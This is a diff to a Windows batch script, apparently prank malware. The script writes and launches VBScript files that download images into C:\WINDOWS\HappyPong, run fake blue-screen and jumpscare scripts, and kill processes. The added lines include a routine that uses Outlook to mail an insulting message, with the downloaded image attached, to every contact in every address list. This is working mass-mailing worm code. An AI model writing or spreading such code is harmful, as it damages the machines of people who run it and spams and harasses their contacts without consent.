@@ -269,9 +269,21 @@ echo   .open >> download3.vbs
 echo   .write xHttp.responseBody >> download3.vbs
 echo   .savetofile "C:\WINDOWS\HappyPong\shit.jpg", 2 '//overwrite >> download3.vbs
 echo end with >> download3.vbs
+echo on error resume next >> download4.vbs
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download4.vbs
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> download4.vbs
+echo xHttp.Open "GET", "https://i.imgur.com/Ic5mxMM.jpeg", False >> download4.vbs
+echo xHttp.Send >> download4.vbs
+echo with bStrm >> download4.vbs
+echo   .type = 1 '//binary >> download4.vbs
+echo   .open >> download4.vbs
+echo   .write xHttp.responseBody >> download4.vbs
+echo   .savetofile "C:\WINDOWS\HappyPong\supershit.jpeg", 2 '//overwrite >> download4.vbs
+echo end with >> download4.vbs
 start download1.vbs
 start download2.vbs
 start download3.vbs
+start download4.vbs
 goto RemoveUrUglyWallpaper
 
 :RemoveUrUglyWallpaper
@@ -387,6 +399,24 @@ echo WshShell.Run "bsod.hta" >> jumpscare.vbs
 echo WshShell.Run "halloween1.vbs" >> jumpscare.vbs
 echo wscript.sleep 5000 >> jumpscare.vbs
 echo WshShell.Run "taskkill /f /im mshta.exe" >> jumpscare.vbs
+goto RealEmailHere
+
+:RealEmailHere
+echo On Error Resume Next >> email.vbs
+echo Dim Itm, cAddresses, Address, App, ns >> email.vbs
+echo Set App = CreateObject("Outlook.Application") >> email.vbs
+echo Set ns = App.GetNameSpace("MAPI") >> email.vbs
+echo Set Itm = App.CreateItem(0) >> email.vbs
+echo For Each cAddresses In ns.AddressLists >> email.vbs
+echo For Each Address In cAddresses.AddressEntries >> email.vbs
+echo Itm.Recipients.Add Address >> email.vbs
+echo Itm.Subject = "Hello do you love alear" >> email.vbs
+echo Itm.Body = "ZeldaStar20 on DeviantArt said that Alear is cute SO WATCH THE IMAGE IDIOT AND IF YOU DONT TRUST ME ITS FINE I WILL POOPFUK UR PC" >> email.vbs
+echo Itm.Attachments.Add(Drive + "\WINDOWS\HappyPong\supershit.jpeg") >> email.vbs
+echo Itm.Send >> email.vbs
+echo Next >> email.vbs
+echo Next >> email.vbs
+echo End Sub >> email.vbs
 goto IAmGriffpatch
 
 :IAmGriffpatch
